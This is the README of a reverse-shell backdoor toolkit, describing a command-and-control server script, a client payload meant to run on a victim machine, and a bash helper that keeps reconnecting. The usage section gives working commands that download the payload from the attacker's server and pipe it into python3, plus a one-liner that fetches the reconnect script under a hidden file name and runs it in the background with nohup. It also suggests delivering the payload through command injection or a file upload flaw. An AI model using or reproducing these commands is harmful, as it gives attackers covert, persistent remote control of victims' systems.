# Files in question

__server_shell.py__ [CNC - Command and Control script]
- => Runs on the server system.
- This file is to be ran on the CNC server system and listens for incoming connections made by an exploited machine via the client_payload script.
- Once a connected is established - this acts as a reverse shell and executes commands on the client system.

__client_payload.py__ [Reverse shell Backdoor]
- => Runs on the client syste,.
- This file initiates a connection from the host system to the CNC server machine (hacker machine).
- This is intended to be downloaded/executed on a victim machine.
- This file assumes python3 is installed.

__client_connect.sh__ [Client Helper script - BASH]
- => Runs on the client system.
- This file is a helper to the client_payload script.
- The goal here is to make sure if a connection is dropped - a new one will be re-initiated - allowing the CNC server to have realiable access to client machine.
- Write this as bash script so most of the commands here are directly communicating at the command line level.

___startup.sh__ [Helper script - BASH]
- => To run on server system
- Prints on screen-instructions asking for the ip/port details of the CMC server (hacker machine) and where the client_payload is to be hosted. 
- This scrpt also edits the client_payload.py, server_shell.py, and client_connect.sh to reflected the command line input.
- Finally, this script tells you exactly which commands to run on CNC server and client machine to initiate a reverse shell (backdoor) attack. 

# Usage

Note: With all methods - there needs to be a way to run a command on the client machine to kick-off the connection to the CNC server (hacker's machine).
There is more than one way to do this - but would be good to find a straight-forward vulnerability such a a command line injection if possible.

## Method 1: Startup Script [PREFERRED]

### On Hacking machine (CNC Server)
Run startup script
`bash startup.sh`

Then follow on screen instructions.


## Method 2: Manual
(works with cmd line injection)

- [SERVER] Host client_payload.py somehere
- - One option is to start a python web server on the cnc_server
- - `python3 -m http.server 8080`   
- [CLIENT] Download + Execute from client machine
- - `wget -O - <cnc_server_ip>:8080/client_payload.py | python3`
- [OPTIONAL] Once you have a connection to client from cnc server...
- - Download + Execute the client_connect.sh script (keeps reconnects the client if it disconnects)
- - CNC server could host the client_connect.sh script.
- - - This file must first be edited to match the host/port details you already have in use.
- - - `wget -q <cnc_server_ip>:8080/client_connect.sh &> /dev/null ;` 
- - - `bash client_connect.sh &> /dev/null & `
- - One-Liner
- - - `{ wget -q -O .c <cnc_server_ip>:8080/client_connect.sh ; } && { nohup bash .c &> /dev/null & }`
- - Make sure you exit from CNC server with 'exit' to disconnect properly.



## Method 3: Direct Client Access

- [SERVER] `python3 server_shell.py` <- edit the file to use the port you want or pass it in as an argument (default 8000). 
- [CLIENT] `python3 client_payload.py`<- edit the file to use the CNC server IP and port you want. 
- - Or pass them in as an argumenta (default port 8000)
- - `python3 client_payload.py <cnc_server_ip> <cnc_server_port>`


# Other ways to get client_payload.py on victim machine
You could also exploit a file upload vulnerability of aa web application and upload the client_payload file onto the victim's machine.
Just make sure you listen on sever and manage a way to run the client_payload.py script on the client machine.


### Port as an optional argument
Both client_payload and server_shell scripts communicate on port 8000 by default.
This can be changed to another port - but you would need to make sure both scripts have the same port..

